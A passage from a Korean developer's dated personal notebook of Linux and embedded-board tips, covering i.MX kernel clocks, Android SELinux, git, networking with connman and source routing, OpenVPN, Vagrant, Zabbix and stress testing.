diff --git a/include/dt-bindings/clock/imx7d-clock.h b/include/dt-bindings/clock/imx7d-clock.h
index c48ef18..19dd3e4 100644
--- a/include/dt-bindings/clock/imx7d-clock.h
+++ b/include/dt-bindings/clock/imx7d-clock.h
@@ -451,5 +451,6 @@
 #define IMX7D_ADC_ROOT_CLK		438
 #define IMX7D_PXP_IPG_CLK		439
 #define IMX7D_PXP_AXI_CLK		440
-#define IMX7D_END_CLK			441
+#define IMX7D_KPP_CLK			441
+#define IMX7D_END_CLK			442
 #endif /* __DT_BINDINGS_CLOCK_IMX7D_H */
```

<https://community.nxp.com/docs/DOC-335087>  


### <span class="section-num">3.195</span> android selinux disable 하기 {#android-selinux-disable-하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-02-09 금 14:15&gt;</span></span>  
adb shell 에서  

```text
setenforce 0
```

[stackoverflow](https://stackoverflow.com/questions/30742524/why-cant-i-open-write-from-a-serial-port-on-android)  


### <span class="section-num">3.196</span> Android Lollipop build fail {#android-lollipop-build-fail}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-02-22 목 11:58&gt;</span></span>  
ubuntu 16 에서 lollipop 빌드시 아래와 같은 에러 발생  

```text
libnativehelper/JniInvocation.cpp:165: error: unsupported reloc 43
clangclang: error: linker command failed with exit code 1 (use -v to see invocation)
: error: linker command failed with exit code 1 (use -v to see invocation)
```

build/core/clang/HOST\_x86\_common.mk 파일의  
CLANG\_CONFIG\_x86\_LINUX\_HOST\_EXTRA\_ASFLAGS 에서 -B 옵션 추가  

```text
CLANG_CONFIG_x86_LINUX_HOST_EXTRA_ASFLAGS := \
  --gcc-toolchain=$($(clang_2nd_arch_prefix)HOST_TOOLCHAIN_FOR_CLANG) \
  --sysroot=$($(clang_2nd_arch_prefix)HOST_TOOLCHAIN_FOR_CLANG)/sysroot \	
  -B$($(clang_2nd_arch_prefix)HOST_TOOLCHAIN_FOR_CLANG)/x86_64-linux/bin
```

make clean 후 다시 빌드  

[stackoverflow](https://stackoverflow.com/questions/36048358/building-android-from-sources-unsupported-reloc-43/36073635)  


### <span class="section-num">3.197</span> Elapsed Time {#elapsed-time}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-03-31 토 17:38&gt;</span></span>  
프로그램 내에서 특정 부분의 실제 사용 시간을 계산할 때가 있다.  
간단한 프로그램이긴 하지만 정밀도가 나노 세컨드 단위로 높아지면정확도 때문에 문제가 생긴다. 실제 imx6 임베디드 보드에서측정한 결과 milli seconds 이상은 정확도에 문제가 있었다.  
이는 CONFIG\_HIGH\_RES\_TIMERS=y 옵션이 커널에 있어야 되기도 하지만  
CONFIG\_HZ=100 이 부분을 수정해야 정확도가 높아지지 않을까 한다.  

```text
#include <time.h>
/* Floating point nanoseconds per second */
#define NANO_PER_SEC 1000000000.0

int main(void)
{
    struct timespec start, end;
    double start_sec, end_sec, elapsed_sec;
    clock_gettime(CLOCK_REALTIME, &start);
    // Your code here
    clock_gettime(CLOCK_REALTIME, &end);
    start_sec = start.tv_sec + start.tv_nsec/NANO_PER_SEC;
    end_sec = end.tv_sec + end.tv_n_sec/NANO_PER_SEC;
    elapsed_sec = end_sec - start_sec;
    printf("The operation took %.3f milli seconds\n", elapsed_sec*1000);
    return 0;
}
```

[stackoverflow](https://stackoverflow.com/questions/14682824/measuring-elapsed-time-in-linux-for-a-c-program)  
[stackoverflow](https://stackoverflow.com/questions/6749621/how-to-create-a-high-resolution-timer-in-linux-to-measure-program-performance)  
<http://www.guyrutenberg.com/2007/09/22/profiling-code-using-clock%5Fgettime/>  


### <span class="section-num">3.198</span> gitlab command line instructions {#gitlab-command-line-instructions}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-04-11 수 15:48&gt;</span></span>  


#### <span class="section-num">3.198.1</span> git global setup {#git-global-setup}

```text
git config --global user.name "ybgwon"
git config --global user.email "ybgwon@localhost"
```


#### <span class="section-num">3.198.2</span> Create a new repository {#create-a-new-repository}

```text
git clone git@debian:ybgwon/uboot-imx.git
cd uboot-imx
touch README.md
git add README.md
git commit -m "add README"
git push -u origin master
```


#### <span class="section-num">3.198.3</span> Existing folder {#existing-folder}

```text
cd existing_folder
git init
git remote add origin git@debian:ybgwon/uboot-imx.git
git add .
git commit -m "Initial commit"
git push -u origin master
```


#### <span class="section-num">3.198.4</span> Existing Git repository {#existing-git-repository}

```text
cd existing_repo
git remote add origin git@debian:ybgwon/uboot-imx.git
git push -u origin --all
git push -u origin --tags
```


### <span class="section-num">3.199</span> git delete branch both local and remote {#git-delete-branch-both-local-and-remote}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-04-12 목 11:25&gt;</span></span>  

```text
$ git push -d <remote_name> <branch_name>
$ git branch -d <branch_name>
```

[stackoverflow](https://stackoverflow.com/questions/2003505/how-do-i-delete-a-git-branch-both-locally-and-remotely?utm%5Fmedium=organic&utm%5Fsource=google%5Frich%5Fqa&utm%5Fcampaign=google%5Frich%5Fqa)  


### <span class="section-num">3.200</span> convert image from gif to jpg {#convert-image-from-gif-to-jpg}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-04-19 목 10:36&gt;</span></span>  

```text
$ convert -strip test.gif test.jpg
```

위 명령은 gif 이미지내에 모든 프레임을 jpeg 으로 변환한다.  
보통 첫번째 이미지만 변환하면 원하는 이미지를 얻을 수 있다.  

```text
$ convert -strip test.gif[0] test.jpg
```

<http://blog.lardev.com/2012/04/10/how-to-convert-from-gif-to-jpg-with/>  


### <span class="section-num">3.201</span> linux desktop recording {#linux-desktop-recording}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-05-26 토 21:59&gt;</span></span>  


#### <span class="section-num">3.201.1</span> shorcut {#shorcut}

1.  To start the recording  
    SUPER-CTRL-R

2.  To pause the recording  
    SUPER-CTRL-P

3.  To stop the recording  
    SUPER-CTRL-F

4.  To show/hide main window  
    SUPER-CTRL-W


### <span class="section-num">3.202</span> cpu clock speed info {#cpu-clock-speed-info}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-06-02 토 10:17&gt;</span></span>  

1.  current  
    
    ```text
    $ watch -n 1  cat /sys/devices/system/cpu/cpu*/cpufreq/cpuinfo_cur_freq
    ```
2.  available  
    
    ```text
    $ cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_frequencies
    ```
3.  max  
    
    ```text
    $ cat /sys/devices/system/cpu/cpu*/cpufreq/scaling_max_freq 
    ```
4.  sysfs dir  
    
    ```text
    $ cd /sys/devices/system/cpu/cpu*/cpufreq/
    ```
5.  info  
    
    ```text
    $ cpufreq-info
    ```


### <span class="section-num">3.203</span> initramfs extract {#initramfs-extract}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-06-02 토 10:48&gt;</span></span>  
MFGTools 에서 사용하는 nand write 용 파일(kobs-ng,nandwrite등)이필요하여 initramfs image 에서 추출한 과정이다.  

1.  binwalk 프로그램으로 cpio 이미지만 추출한다.  
    
    ```text
    $ binwalk -e fsl-image-mfgtool-initramfs-imx_mfgtools.cpio.gz.u-boot
    $ ls
    _fsl-image-mfgtool-initramfs-imx_mfgtools.cpio.gz.u-boot.extracted
    fsl-image-mfgtool-initramfs-imx_mfgtools.cpio.gz.u-boot
    $ ls _fsl-image-mfgtool-initramfs-imx_mfgtools.cpio.gz.u-boot.extracted
    fsl-image-mfgtool-initramfs-imx6qdlsolo-20160916230931.rootfs.cpio
    ```
    
    \_파일명 아래 디렉토리에  
    fsl-image-mfgtool-initramfs-imx6qdlsolo-20160916230931.rootfs.cpio  
    파일이 생성되어 있다.
2.  cpio 파일에서 rootfs를 복구한다.  
    
    ```text
    $ mkdir rootfs && cd rootfs
    $ cpio -i -d -H newc --no-absolute-filenames <
    ../_fsl-image-mfgtool-initramfs-imx_mfgtools.cpio.gz.u-boot.extracted/
    fsl-image-mfgtool-initramfs-imx6qdlsolo-20160916230931.rootfs.cpio 
    ```
    
    파일명이 길어 괜히 햇갈리는 것 같다.
3.  링크  
    <https://wiki.gentoo.org/wiki/Custom%5FInitramfs>  
    <https://unix.stackexchange.com/questions/157211/extract-embedded-initramfs>


### <span class="section-num">3.204</span> wget renaming file {#wget-renaming-file}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-06-03 일 23:32&gt;</span></span>  

1.  -c -O 옵션 사용  
    -c 옵션은 continue 옵션으로 이전 파일을 부분적으로 받은게있으면 이어서 받게 해준다.  
    -O 옵션은 output-document 옵션으로 rename이 가능하게 한다.  
    
    ```text
    wget -c ftp://192.168.0.2/kobs-ng -O tmp/kobs-ng
    ```
2.  -cO - 옵션 사용셸 리다이렉션을 사용하여 renaming  
    
    ```text
    
    ```


### <span class="section-num">3.205</span> ubifs fastmap u-boot args {#ubifs-fastmap-u-boot-args}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-06-04 월 01:03&gt;</span></span>  
커널에서 ubi fastmap 설정을 하고 적용이 되기 위해선 한번은  
u-boot 에서 아래 옵션을 주고 부팅하여야 한다.  

```text
ubi.fm_autoconvert=1
```


### <span class="section-num">3.206</span> monitor dd progress {#monitor-dd-progress}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-06-04 월 16:08&gt;</span></span>  

1.  version 8.24 이상 부터는 status 옵션이 지원된다.  
    
    ```text
    $ dd if=/dev/urandom of=/dev/null status=progress
    ```
    
    현재 linuxmint(18.3 sylvia) 에서 동작 안함  
    pv 사용  
    
    ```text
    $ export image=fsl-image-qt5-validation-imx-xwayland-imx6qpdlsolox.sdcard
    $ dd if=$image | pv -s $(du -b $image|cut -f1) | sudo dd of=/dev/sdc bs=1M conv=fsync
    ```

[askubuntu](https://askubuntu.com/questions/215505/how-do-you-monitor-the-progress-of-dd?utm%5Fmedium=organic&utm%5Fsource=google%5Frich%5Fqa&utm%5Fcampaign=google%5Frich%5Fqa)  


### <span class="section-num">3.207</span> grabserial 사용법 {#grabserial-사용법}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-06-05 화 17:00&gt;</span></span>  
부팅시간 측정용 프로그램  

```text
$ grabserial -d /dev/ttyUSB0 -t -m "U-Boot 2017" -i "imx6ul7d login:" -q "imx6ul7d login:" 
```

"U-Boot 2017" 메시지에서 "imx6ul7d login:" 까지의 메시지 사이의콘솔 출력 시간들을 표시한다. -i 옵션은 마지막에 패턴 까지의 시간을표시해 준다. -q 옵션은 패턴을 만나면 프로그램을 끝낸다.  


### <span class="section-num">3.208</span> Extract files from rpm {#extract-files-from-rpm}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-06-29 금 16:42&gt;</span></span>  

```text
$ rpm2cpio myrpmfile.rpm | cpio -idmv
```


### <span class="section-num">3.209</span> changing mac address {#changing-mac-address}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-07-13 금 13:37&gt;</span></span>  


#### <span class="section-num">3.209.1</span> ifconfig {#ifconfig}

```text
$ sudo /etc/init.d/networking stop
$ sudo ifconfig eth0 hw ether 02:01:02:03:04:08
$ sudo /etc/init.d/networking start 
```


#### <span class="section-num">3.209.2</span> ip utils {#ip-utils}

```text
$ sudo /etc/init.d/network stop
$ sudo ip link set eth0 address 02:01:02:03:04:08
$ sudo /etc/init.d/network start 
```


#### <span class="section-num">3.209.3</span> /etc/network/interfaces {#etc-network-interfaces}

```text
hwaddress ether 02:01:02:03:04:08
```


#### <span class="section-num">3.209.4</span> 참조 {#참조}

<https://en.wikibooks.org/wiki/Changing%5FYour%5FMAC%5FAddress/Linux>  


### <span class="section-num">3.210</span> connman static ip {#connman-static-ip}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-07-13 금 13:51&gt;</span></span>  

```text
$ connmanctl services   # Take note of the interface you want to modify, the general format for a wired connection is ethernet_<MAC_ADDR>_cable
$ connmanctl config <service> --ipv4 manual  <ip address> <netmask> <gateway>
```

```text
root@imx6qsabresd:~# connmanctl services
*AR Wired                ethernet_000102030411_cable
*AR Wired                ethernet_000102030412_cable
*AR Wired                ethernet_000102030413_cable
*AR Wired                ethernet_000102030414_cable

$ root@imx6qsabresd:~# connmanctl config ethernet_000102030414_cable --ipv4 manual 192.168.0.54 255.255.255.0 192.168.0.1
```

<https://wiki.tizen.org/IVI/ConnMan%5FTips%5F&%5FTricks>  


### <span class="section-num">3.211</span> connman 을 이용한 multi 랜 설정 {#connman-을-이용한-multi-랜-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-07-13 금 14:55&gt;</span></span>  
하나의 호스트에 물리적으로 랜이 여럿있을 경우 인터페이스의 링크다운을감지하여 라우팅 설정등을 자동으로 하기가 까다롭다.  
connman을 이용하여 이를 자동처리 할 수 있는데 내부적으로 어떻게동작하는 지는 아직 모르겠다. 와이파이와 랜을 함께 동작시키고 하는자동화 과정이 유선랜에도 적용되어 링크 다운을 감지하면 자동으로라우팅 설정을 다시 하는 것 같다. 보통 리눅스에서 같은 서브넷내에서멀티 랜카드가 있으면 arp filtering 설정과 source routing 등을구현하여야 하는데 이번에 이를 설정하다가 connman 으로 설정하는 간단한방법을 확인하게 되었다. 단 connman은 default 로 유동아이피 설정을하는데 고정아이피를 사용하려면 고정 맥주소가 아니면 매번  
/var/lib/connamn 아래 설정이 바뀌어 되어 곤란해진다. 그래서 고정맥을설정하고 고정아이피 설정을 하는 작업을 하여야 한다.  


#### <span class="section-num">3.211.1</span> mac address 설정 {#mac-address-설정}

고정 아이피를 사용하기 위해 램덤 맥주소를 고정하기 위하여  
/etc/default/connman 파일 작성. /etc/init.d/connman 에서이 파일을 source 한다.  

```text
$ cat /etc/default/connman
ip link set dev eth1 address 00:01:02:03:04:11
ip link set dev eth2 address 00:01:02:03:04:12
ip link set dev eth3 address 00:01:02:03:04:13
ip link set dev eth4 address 00:01:02:03:04:14
```


#### <span class="section-num">3.211.2</span> 고정 아이피 설정 {#고정-아이피-설정}

```text
$ connmanctl config ethernet_000102030411_cable --ipv4 manual 192.168.0.51 255.255.255.0 192.168.0.1
$ connmanctl config ethernet_000102030412_cable --ipv4 manual 192.168.0.52 255.255.255.0 192.168.0.1
$ connmanctl config ethernet_000102030413_cable --ipv4 manual 192.168.0.53 255.255.255.0 192.168.0.1
$ connmanctl config ethernet_000102030414_cable --ipv4 manual 192.168.0.54 255.255.255.0 192.168.0.1
```


### <span class="section-num">3.212</span> 같은 subnet 아래 multi 랜카드 설정 {#같은-subnet-아래-multi-랜카드-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-07-13 금 15:20&gt;</span></span>  


#### <span class="section-num">3.212.1</span> 커널 설정 {#커널-설정}

```text
CONFIG_IP_ADVANCED_ROUTER=y
CONFIG_IP_MULTIPLE_TABLES=y
```


#### <span class="section-num">3.212.2</span> ARP filtering {#arp-filtering}

1.   configure sysctl and add following /etc/sysctl.conf

    ```text
    $ sysctl -w net.ipv4.conf.all.arp_filter=1
    $ sysctl -w net.ipv4.conf.all.arp_ignore=2
    $ sysctl -w net.ipv4.conf.all.arp_announce=2
    ```
    
    ```text
    net.ipv4.conf.all.arp_filter = 1
    net.ipv4.conf.all.arp_ignore = 2
    net.ipv4.conf.all.arp_announce = 2
    ```

2.   링크

    [serverfault](https://serverfault.com/questions/415304/multiple-physical-interfaces-with-ips-on-the-same-subnet)  
    [serverfault](https://serverfault.com/questions/336021/two-network-interfaces-and-two-ip-addresses-on-the-same-subnet-in-linux)  


#### <span class="section-num">3.212.3</span> Source Based Routing {#source-based-routing}

1.   Kernel Config

    –  IP\_ADVANCED\_ROUTER=yes  
    –  IP\_MULTIPLE\_TABLES=yes  

2.   Add new routing table in /etc/iproute2/rt\_tables

    ```text
    ... top of file omitted ...
    1    table0
    2    table1
    3    table2
    4    table3
    5    table4
    ```

3.   Define Routes

    ```text
    # ip route add default via 192.168.0.1 table table0
    # ip route add default via 192.168.0.1 table table1
    # ip route add default via 192.168.0.1 table table2
    # ip route add default via 192.168.0.1 table table3
    # ip route add default via 192.168.0.1 table table4
    # ip route add 192.168.0.0/24 dev eth0 src 192.168.0.45 table table0
    # ip route add 192.168.0.0/24 dev bond0 src 192.168.0.46 table table1
    # ip route add 192.168.0.0/24 dev bond1 src 192.168.0.47 table table2
    ```

4.   Define Rules

    ```text
    # ip rule add from 192.168.0.45 table table0
    # ip rule add from 192.168.0.46 table table1
    # ip rule add from 192.168.0.47 table table2
    ```

5.   Test

    ```text
    # ping -I bond0 192.168.0.2
    # ping -I bond1 192.168.0.2
    ```


### <span class="section-num">3.213</span> linux bridge 설정 {#linux-bridge-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-07-13 금 15:08&gt;</span></span>  


#### <span class="section-num">3.213.1</span> 커널 옵션 {#커널-옵션}

bridge 를 활성화하면 stp도 활성화 된다  

```text
CONFIG_STP=m
CONFIG_BRIDGE=m
```


#### <span class="section-num">3.213.2</span> ip util을 이용한 브릿지 설정 {#ip-util을-이용한-브릿지-설정}

```text
# ip link add name bridge_name type bridge
# ip link set bridge_name up
# ip link set eth0 up
# ip link set eth0 master bridge_name
```

```text
# ip link add name br0 type bridge
# ip link set br0 up
# ip link set bond0 up
# ip link set bond0 master br0
```

<https://wiki.archlinux.org/index.php/Network%5Fbridge>  


### <span class="section-num">3.214</span> epoch convert {#epoch-convert}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-02-08 금 16:11&gt;</span></span>  

1.  get epoch from current time  
    
    ```text
    $ date +%s
    1549609561
    ```
2.  get date from epoch  
    
    ```text
    $ date -d @2000000000
    2033. 05. 18. (수) 12:33:20 KST
    ```
3.  get epoch from given date  
    
    ```text
    $ date -d '2012-06-12 07:21:22' +%s
    ```


### <span class="section-num">3.215</span> checkinstall {#checkinstall}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-02-13 수 12:38&gt;</span></span>  
소스 파일을 가지고 make install 로 설치시 삭제의 어려움 때문에패키지를 빌드하여 설치하려고 한다. 하지만 패키지 빌드도 만만치 만은않다.  
make install 대신 checkinstall 을 사용하면 패키지를 자동 빌드하여설치를 진행한다. 이렇게 되면 패키지 관리자에 의해 관리가 되므로쉽게 삭제를 할 수 있다.  
&#x2013;install=no 옵션을 사용하면 설치는 하지 않고 패키지 빌드까지만할 수 도 있다.  

```text
$ wget http://ftp.gnu.org/gnu/hello/hello-2.10.tar.gz
$ tar xvf hello-2.10.tar.gz
$ cd hello-2.10/
$ ./configure
$ make
```

여기 까지는 linux 에서 소스를 빌드하여 설치하는 일반적인 형식이다.  
이후에 sudo make install 을 이용하여 최종 바이너리를 설치하게 되는데대신에 sudo checkinstall 을 사용하는 것이다.  

```text
$ sudo checkinstall --install=no
$ sudo dpkg -i hello_2.10-1_amd64.deb
또는 설치까지 바로 하려면
$ sudo checkinstall
```

빌드한 패키지 설치시 /usr/local/share/info/dir 이미 존재하여에러가 난다면 아래와 같이 강제 설치한다.  

```text
$ sudo dpkg -i --force-overwrite global_6.6.3-1_amd64.deb 
```

<https://www.ostechnix.com/build-packages-source-using-checkinstall/>  
<https://ubuntuforums.org/showthread.php?t=2265398>  


### <span class="section-num">3.216</span> systemd timer {#systemd-timer}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-03-08 금 18:07&gt;</span></span>  
systemd timer를 사용하여 cron을 대신할 수 있다. 사용자 관점에서  
systemd를 사용할 수 있는데 systemd 샐행시 &#x2013;user 옵션을 추가하면 된다.  
systemd가 user unit 을 찾는 디렉토리는 아래와 같다.  

```text
$HOME/.config/systemd/user/*
$HOME/.local/share/systemd/user/*
```

위 디렉토리에 \*.timer \*.service 파일을 두고 아래를 실행하면 된다.  

```text
$ systemctl --user daemon-reload

$ systemctl --user start backup-work.service

매번 시스템을 시작할 때마다 타이머를 활성화하려면, 다음 명령을 실행하십시오:
$ systemctl --user enable backup-work.timer

서비스 실행 최종 결과를 확인하려 한다면:
$ systemctl --user list-timers
```

<https://wiki.gentoo.org/wiki/Systemd/ko>  
<https://wiki.archlinux.org/index.php/Systemd/Timers>  


### <span class="section-num">3.217</span> openvpn 설정 {#openvpn-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-03-15 금 16:06&gt;</span></span>  
linux 에서 vpn을 사용하려면 client 의 경우 network 관리자에서  
vpn 연결을 추가 하여 사용할 수 있다.  
그밖에 여러가지 방법이 있겠지만  
openvpn 패키지를 사용하여 server와 client를 구축하는 방법을 설명한다.  
openvpn은 설정 파일을 가지고 server 와 client를 구분한다.  
우선 패키지를 설치하여 서버 부터 구성해 본다.  


#### <span class="section-num">3.217.1</span> server 구성 {#server-구성}

server와 client 에서 사용하는 key 생성을 위해서 easy-rsa 패키지도같이 설치해야 한다.  

```text
$ apt install openvpn easy-rsa
```

설치후 /usr/share/doc/openvpn/examples/sample-config-files  
아래 예제 설정파일 들이 있으니 이 파일들을 /etc/openvpn 아래복사하고 변경하는 방식을 사용한다.  
debian의 경우 default 로 /etc/openvpn 아래 \*.conf 파일을모두 로드한다.  
변경한 부분은 다음과 같다.  

1.  topology subnet 주석 해제
2.  comp-lzo 주석해제
3.  user nobody 주석해제
4.  group nobody 주석해제
5.  ca cert key dh tls-auth 관련 key 파일들 경로 지정

대부분 기본 값을 사용하면 되고 cipher 나 compress 관련 옵션은당연하겠지만 client 와 같게 하여야 한다.  
또 push "redirect-gateway def1 bypass-dhcp" 옵션이 있는데이 부분을 주석처리 하면 모든 트래픽에 대해서 서버 쪽으로  
redirect 하는 것인데 서버 쪽에 NAT 나 birdge 설정이 제대로되어 있어야 동작한다.  
openvpn을 사용하기 위한 key들을 만들어 주어야 하는데 easyrsa 를사용한다.  

```text
$ ./easyrsa init-pki
$ ./easyrsa build-ca nopass
hit enter
 
$ ./easyrsa gen-req server1 nopass
hit enter
 
$ ./easyrsa gen-req client1 nopass
hit enter
 
$ ./easyrsa sign-req client client1
type yes
 
$ ./easyrsa sign-req server server1
type yes
 
$ ./easyrsa gen-dh
```

tls-auth를 사용하기 위한 key 도 생성한다.  

```text
$ sudo openvpn --genkey --secret /etc/openvpn/ta.key
```

ip\_forward를 enable 한다.  

```text
$ cat /etc/sysctl.conf
# Packet forwarding
net.ipv4.ip_forward = 1
$ sudo sysctl -p
```

openvpn 서버를 재시작한다.  

```text
$ sudo service openvpn restart
```


#### <span class="section-num">3.217.2</span> client 구성 {#client-구성}

client 경우는 위에서 만든 client 관련 key 파일을 다운 받아서  
openvpn을 client mode 로 실행한다.  
client 설정 파일도  
/usr/share/doc/openvpn/examples/sample-config-files/client.conf  
을 /etc/openvpn 아래 복사하여 수정한다.  
변경 부분은 아래와 같다.  

1.  remote xxx.xxx.xxx.xxx 1194 부분에 amazon ec2 ip로 변경
2.  user nobody group nobody 주석 해제
3.  cipher comp-lzo 부분 서버와 같게 수정
4.  ca cert key tls-auth 파일 경로 수정

변경후 openvpn 재시작  

```text
$ sudo systemctl daemon-reload
$ sudo systemctl restart openvpn
```

서버에 제대로 연결되면 tun0 디바이스에 아이피가 할당되고 server와  
vpn 연결되어 서버 리소스를 사용할 수 있다.  

```text
$ ip a
...
20: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    link/none 
    inet 10.8.0.2/24 brd 10.8.0.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::d5fb:ea33:e760:2c37/64 scope link flags 800 
       valid_lft forever preferred_lft forever

$ ping -c1 10.8.0.1
PING 10.8.0.1 (10.8.0.1) 56(84) bytes of data.
64 bytes from 10.8.0.1: icmp_seq=1 ttl=255 time=4.18 ms

--- 10.8.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 4.188/4.188/4.188/0.000 ms

$ ip route
default via 192.168.0.1 dev enp3s0  proto static  metric 100 
10.8.0.0/24 dev tun0  proto kernel  scope link  src 10.8.0.2 
13.125.46.130 via 192.168.0.1 dev enp3s0 
```


#### <span class="section-num">3.217.3</span> 링크 {#링크}

[some guy's blog](https://tonygillilan.com/blog/install-openvpn-on-centos-7-4-with-easy-rsa-3/)  


### <span class="section-num">3.218</span> vagrant 사용법 {#vagrant-사용법}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-03-25 월 14:35&gt;</span></span>  

1.  먼저 생성할 os 를 cloud에서 검색한다.  
    <https://app.vagrantup.com/boxes/search>  
    사이트에 등록하면 cmdline 에서도 검색이 가능하다.  
    
    ```text
    $ vagrant cloud search stretch
    ...
    ```
2.  vagrant가 사용할 디렉토리를 만들고 Vagrantfile 을 편집한다.  
    vm.box 부분을 검색한 이름으로 변경한다.  
    vm.define, hostname 부분을 적당히 변경한다.  
    network 를 NAT(private\_network) 나 Bridge(public\_network) 중에 선택한다.  
    
    ```text
    $ mkdir ~/Vagrant; cd ~/Vagrant
    $ cat Vagrantvile
    Vagrant.configure("2") do |config| 
    
    config.vm.define :chef_server do |host|
     host.vm.box = "centos/7"
     host.vm.hostname = "chef-server"
     host.vm.network :private_network, ip: "192.168.1.2"
    end 
    
    config.vm.define :my_node do |host|
     host.vm.box = "ubuntu/xenial64"
     host.vm.hostname = "my-node"
     host.vm.network :private_network, ip: "192.168.1.3"
    end 
    
    config.vm.define :my_workstation do |host|
     host.vm.box = "ubuntu/xenial64"
     host.vm.hostname = "my-workstation"
     host.vm.network "public_network", bridge: "enp3s0"
     end
    
    config.vm.provider :virtualbox do |vb|
     vb.memory = "1024"
     vb.cpus = "1"
    end
    end
    ```
3.  up 명령을 내리면 자동으로 vm 을 다운받아 설치한다.  
    
    ```text
    $ vagrant up
    전체 vm 모두 설치
    $ vagrant up my_workstation
    my_workstation vm만 설치
    ```
4.  vm에 ssh 연결  
    
    ```text
    $ vagrant ssh my_workstation
    ```
5.  vm 종료  
    
    ```text
    $ vagrant halt my_workstation
    ```
6.  vm 삭제  
    
    ```text
    $ vagrant destory my_workstation
    ```
7.  상태보기  
    
    ```text
    $ vagrant status
    Current machine states:
    
    chef_server               poweroff (virtualbox)
    my_node                   poweroff (virtualbox)
    my_workstation            poweroff (virtualbox)
    my_stretch                running (virtualbox)
    ...
    ```


### <span class="section-num">3.219</span> zabbix 설치 {#zabbix-설치}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-03-25 월 15:08&gt;</span></span>  
<https://www.zabbix.com/download>  
문서 안내에 따라 설치한다.  
설치후 설정 -> 호스트 -> 호스트 작성에서모니터할 호스트를 추가한다. 모니터 할 호스트에는 zabbix-agent 가설치 되어 있어야 한다. 서버와 agent 간의 버전이 다르면 안된다.  


### <span class="section-num">3.220</span> zabbix user parameter {#zabbix-user-parameter}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-04-10 수 11:47&gt;</span></span>  
zabbix 에서 특정 모니터링을 추가해야할 경우가 있다.  
i.mx 보드의 cpu 온도를 모니터링 하고자 하는데 zabbix 에서지원하지 않으므로 custom item을 추가해서 사용할 수 있다.  

1.  zabbix\_agentd.conf 파일에서  
    UserParameter=<key>,<shell command> 형식으로추가하거나 userparam.conf 파일을 include 하도록 설정  
    
    ```text
    $ cat /etc/zabbix_agentd.conf
    Include=/etc/zabbix_agentd.conf.d/*.conf
    ```

2.  /etc/zabbix\_agentd.conf.d/userparam.conf  
    파일에서 키를 등록한다.  
    
    ```text
    $ cat userparam.conf
    UserParameter=temp.cpu, echo $(($(cat /sys/class/thermal/thermal_zone0/temp)/1000))
    ```

3.  설정 -> 호스트 -> 아이템 -> 아이템작성키 항목에 UserParameter에서 추가한 항목 선택여기 까지 하면 아이템이 추가 되었으므로 상태를 그래프 등으로모니터링 할 수 있다.

4.  설정 -> 호스트 -> 트리거 -> 트리거작성조건식 빌더에서 temp.cpu를 선택하여 80도 이상이면장애 트리거가 발생하도록 작성

5.  테스트  
    
    ```text
    $ zabbix_get -s 192.168.10.61 -p 10050 -k temp.cpu
    ```


### <span class="section-num">3.221</span> sshuttle 사용법 {#sshuttle-사용법}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-04-07 일 00:14&gt;</span></span>  
ssh 와 python을 이용한 vpn 프로그램이다. 제작자는 가난한 이의 vpn  
으로 소개하고 있다.  


#### <span class="section-num">3.221.1</span> 요구사항 {#요구사항}

1.   Client side

    1.  sudo, or root access on your client machine.
    
    (The server doesn’t need admin access.)  
    
    1.  Python 2.7 or Python 3.5

2.   Server side

    Between Python 2.4 and Python 3.6  


#### <span class="section-num">3.221.2</span> 사용법 {#사용법}

1.  sshuttle 을 설치한다.  
    
    ```text
    $ apt install sshuttle
    ```
2.  sshuttle 프로그램을 사용하여 vpn을 구성할 ssh server에 로그인한다.  
    
    ```text
    $ sudo sshuttle -r ybgwon@are.iptime.org:20022 0/0 -vv
    ```


#### <span class="section-num">3.221.3</span> 링크 {#링크}

<https://sshuttle.readthedocs.io/en/stable/index.html>  
<https://www.unixmen.com/sshuttle-poor-mans-vpn-ssh/>  


### <span class="section-num">3.222</span> cpu load test by yes command {#cpu-load-test-by-yes-command}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-04-08 월 11:44&gt;</span></span>  
2 core exam  

```text
$ yes > /dev/null &
$ yes > /dev/null &
...
$ killall yes
```

[stackoverflow](https://stackoverflow.com/questions/2925606/how-to-create-a-cpu-spike-with-a-bash-command)  


### <span class="section-num">3.223</span> stressapptest {#stressapptest}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-04-08 월 15:52&gt;</span></span>  
memory, disk, network 테스트 프로그램  

1.  Run memory test  
    기본 20초 동안 테스트 하고 -s 옵션으로 시간 조정 가능  
    
    ```text
    $ stressapptest -M 256 -m 4 -C 4 -W
    ```
2.  Run a memory test with HDD and network. log to file test.log  
    보드에서 아래 명령 실행  
    
    ```text
